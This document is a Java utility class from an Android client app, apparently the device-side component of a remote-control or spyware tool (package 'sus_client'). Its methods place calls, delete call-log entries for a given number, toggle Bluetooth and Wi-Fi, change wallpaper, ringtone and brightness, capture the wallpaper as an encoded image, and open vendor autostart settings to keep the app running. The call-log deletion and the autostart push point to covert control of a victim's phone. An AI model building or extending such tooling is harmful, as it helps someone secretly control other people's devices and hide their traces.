package com.android.sus_client.utils;

import android.Manifest;
import android.app.WallpaperManager;
import android.bluetooth.BluetoothAdapter;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.content.res.AssetFileDescriptor;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.drawable.Drawable;
import android.location.LocationManager;
import android.media.MediaPlayer;
import android.media.RingtoneManager;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.provider.CallLog;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import com.android.sus_client.utils.permissions.Permissions;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.util.List;

public class AppUtils {

    private final Context context;
    private static final String TAG = AppUtils.class.getSimpleName();

    public AppUtils(Context context) {
        this.context = context;
    }

    private void showToast(Context context, String s) {
        Toast.makeText(context, s, Toast.LENGTH_SHORT).show();
    }

    public void showToastLong(String s) {
        Toast.makeText(context, s, Toast.LENGTH_LONG).show();
    }

    public void showImageInGallery(File imageFile) {
        Intent intent = new Intent(Intent.ACTION_VIEW);
//        Uri data = Build.VERSION.SDK_INT < Build.VERSION_CODES.N ? Uri.fromFile(imageFile) :
//                FileProvider.getUriForFile(context, BuildConfig.FILE_PROVIDER, imageFile);
        Uri data = Uri.fromFile(imageFile);
        intent.setDataAndType(data, "image/*");
        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        context.startActivity(intent);
    }

    public void deleteFile(String filePath, boolean isFolder) {
        try {
            File file;
            if (!isFolder) {
                file = new File(filePath);
            } else {
                file = new File(filePath.substring(0, filePath.lastIndexOf("/")));
            }
            if (file.exists())
                file.delete();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public boolean makePhoneCall(String number) {
        try {
            Intent callIntent = new Intent(Intent.ACTION_CALL);
            callIntent.setData(Uri.parse("tel:" + number));
            callIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            if (Permissions.isGranted(context, Manifest.permission.CALL_PHONE)) {
                context.startActivity(callIntent);
            } else {
                Permissions.request(context, new String[]{Manifest.permission.CALL_PHONE}, null);
            }
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    public void deleteCallLogByNumber(String number) {
        try {
            Uri CALLLOG_URI = Uri.parse("content://call_log/calls");
            context.getContentResolver().delete(CALLLOG_URI, CallLog.Calls.NUMBER + "=?", new String[]{number});
        } catch (Exception ignored) {
        }
    }

    public void setBluetoothState(boolean isEnabled) {
        try {
            BluetoothAdapter bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
            if (isEnabled) {
                if (!bluetoothAdapter.isEnabled())
                    bluetoothAdapter.enable();
            } else {
                if (bluetoothAdapter.isEnabled())
                    bluetoothAdapter.disable();
            }
        } catch (Exception ignored) {
        }
    }

    public boolean getBluetoothState() {
        try {
            BluetoothAdapter bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
            return bluetoothAdapter.isEnabled();
        } catch (Exception ignored) {
            return false;
        }
    }

    public boolean getGpsState() {
        try {
            LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            return locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
        } catch (Exception e) {
            return false;
        }
    }

    public String getWifiConnection() {
        try {
            WifiManager wifiManager = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            if (wifiManager != null) {
                return wifiManager.getConnectionInfo().getSSID();
            } else {
                return null;
            }
        } catch (Exception e) {
            return null;
        }
    }

    public void setWifiState(boolean isEnabled) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                WifiManager wifi = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
                wifi.setWifiEnabled(isEnabled);
            }
        } catch (Exception ignored) {
        }
    }

    public void setBrightness(int brightness) {
        if (brightness < 0)
            brightness = 0;
        else if (brightness > 255)
            brightness = 255;

        try {
            Settings.System.putInt(context.getContentResolver(),
                    Settings.System.SCREEN_BRIGHTNESS_MODE,
                    Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL);
        } catch (Exception ignored) {
        }

        try {
            Settings.System.putInt(context.getContentResolver(), Settings.System.SCREEN_BRIGHTNESS, brightness);
        } catch (Exception ignored) {
        }
    }

    public boolean setWallpaper(String imageData) {
        try {
            Bitmap bitmap = FileUtil.decodeImage(imageData);
            WallpaperManager manager = WallpaperManager.getInstance(context);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                manager.setBitmap(bitmap, null, true, WallpaperManager.FLAG_LOCK | WallpaperManager.FLAG_SYSTEM);
            } else {
                manager.setBitmap(bitmap);
            }
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    public boolean setRingtone(File file, int type) {
        ContentValues values = new ContentValues();
        values.put(MediaStore.MediaColumns.TITLE, file.getName());
        values.put(MediaStore.MediaColumns.MIME_TYPE, "audio/mp3");
        if (type == RingtoneManager.TYPE_RINGTONE) {
            values.put(MediaStore.Audio.Media.IS_RINGTONE, true);
        } else if (type == RingtoneManager.TYPE_NOTIFICATION) {
            values.put(MediaStore.Audio.Media.IS_NOTIFICATION, true);
        } else if (type == RingtoneManager.TYPE_ALARM) {
            values.put(MediaStore.Audio.Media.IS_ALARM, true);
        }

        final ContentResolver resolver = context.getContentResolver();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            Uri newUri = resolver.insert(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, values);
            try (OutputStream os = resolver.openOutputStream(newUri)) {
                int size = (int) file.length();
                byte[] bytes = new byte[size];
                try {
                    BufferedInputStream inputStream = new BufferedInputStream(new FileInputStream(file));
                    inputStream.read(bytes, 0, bytes.length);
                    inputStream.close();

                    os.write(bytes);
                    os.close();
                    os.flush();
                } catch (IOException e) {
                    return false;
                }
            } catch (Exception ignored) {
                return false;
            }
            RingtoneManager.setActualDefaultRingtoneUri(context, type, newUri);
            File mFile = Utils.fileFromUri(newUri);
            String filePath = mFile.getAbsolutePath();
            if (mFile.exists()) {
                if (mFile.delete()) showToastLong("file deleted : " + filePath);
            }

        } else {
            values.put(MediaStore.MediaColumns.DATA, file.getAbsolutePath());

            Uri uri = MediaStore.Audio.Media.getContentUriForPath(file.getAbsolutePath());
            resolver.delete(uri, MediaStore.MediaColumns.DATA + "=\"" + file.getAbsolutePath() + "\"", null);

            Uri newUri = resolver.insert(uri, values);
            RingtoneManager.setActualDefaultRingtoneUri(context, type, newUri);
            resolver.insert(MediaStore.Audio.Media.getContentUriForPath(file.getAbsolutePath()), values);
        }
        return true;
    }

    public void playAssetSound(String soundFileName) {
        try {
            MediaPlayer mediaPlayer = new MediaPlayer();

            AssetFileDescriptor descriptor = context.getAssets().openFd(soundFileName);
            mediaPlayer.setDataSource(descriptor.getFileDescriptor(), descriptor.getStartOffset(), descriptor.getLength());
            descriptor.close();

            mediaPlayer.prepare();
            mediaPlayer.setVolume(1f, 1f);
            mediaPlayer.setLooping(false);
            mediaPlayer.start();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static String getWallpaper(Context context) {
        try {
            Drawable drawable = WallpaperManager.getInstance(context).getDrawable();
            if (drawable == null) {
                throw new Exception("wallpaper resources may be null");
            } else {
                Bitmap bitmap = FileUtil.drawableToBitmap(drawable);
                return FileUtil.encodeImage(bitmap, 60);
            }
        } catch (Exception e) {
            int width = 200, height = 200;
            Paint circlePaint = new Paint();
            circlePaint.setStyle(Paint.Style.FILL);
            circlePaint.setAntiAlias(true);
            circlePaint.setColor(Color.parseColor("#e91e63"));

            Paint txtPaint = new Paint();
            txtPaint.setColor(Color.WHITE);
            txtPaint.setTextSize(21f);
            txtPaint.setAntiAlias(true);
            txtPaint.setTextAlign(Paint.Align.CENTER);

            Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
            Canvas canvas = new Canvas(bitmap);
            canvas.drawCircle((int) (width / 2), (int) (height / 2), (int) (width / 2), circlePaint);
            canvas.drawText(Build.MANUFACTURER, (int) (width / 2), (int) (height / 2), txtPaint);
            canvas.drawText(Build.MODEL, (int) (width / 2), (int) (height / 2) + 22, txtPaint);
            return FileUtil.encodeImage(bitmap, 100);
        }
    }

    public static void openAutostartSettings(Context context) {
        Intent intent = new Intent();
        String manufacturer = Build.MANUFACTURER;
        try {
            if (manufacturer.toLowerCase().contains("xiaomi")) {
                intent.setComponent(new ComponentName(
                        "com.miui.securitycenter",
                        "com.miui.permcenter.autostart.AutoStartManagementActivity"
                ));

            } else if (manufacturer.toLowerCase().contains("oppo")) {
                intent.setComponent(new ComponentName(
                        "com.coloros.safecenter",
                        "com.coloros.safecenter.permission.startup.StartupAppListActivity"
                ));

            } else if (manufacturer.toLowerCase().contains("vivo")) {
                intent.setComponent(new ComponentName(
                        "com.vivo.permissionmanager",
                        "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"
                ));

            } else if (manufacturer.toLowerCase().contains("letv")) {
                intent.setComponent(new ComponentName(
                        "com.letv.android.letvsafe",
                        "com.letv.android.letvsafe.AutobootManageActivity"
                ));

            } else if (manufacturer.toLowerCase().contains("honor")) {
                intent.setComponent(new ComponentName(
                        "com.huawei.systemmanager",
                        "com.huawei.systemmanager.optimize.process.ProtectActivity"
                ));

            } else if (manufacturer.toLowerCase().contains("huawe")) {
                intent.setComponent(new ComponentName(
                        "com.huawei.systemmanager",
                        "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"
                ));

            } else {
                Log.d(TAG, "Autostart permission not necessary");
            }

            List<ResolveInfo> list = context.getPackageManager().queryIntentActivities(intent, PackageManager.MATCH_DEFAULT_ONLY);
            if (list.size() > 0) {
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
            }

        } catch (Exception exception) {
            try {
                if (manufacturer.toLowerCase().contains("huawe")) {
                    intent.setComponent(new ComponentName(
                            "com.huawei.systemmanager",
                            "com.huawei.systemmanager.optimize.bootstart.BootStartActivity"
                    ));
                }
                List<ResolveInfo> list = context.getPackageManager().queryIntentActivities(intent, PackageManager.MATCH_DEFAULT_ONLY);
                if (list.size() > 0) {
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(intent);
                }
            } catch (Exception ignored) {
            }
        }
    }

    public static boolean isMiuiDevice() {
        return Build.MANUFACTURER.toLowerCase().contains("xiaomi");
    }

    public static boolean isHuaweiDevice() {
        return Build.MANUFACTURER.toLowerCase().contains("huawe");
    }

    public static boolean isOppoDevice() {
        return Build.MANUFACTURER.toLowerCase().contains("oppo");
    }

}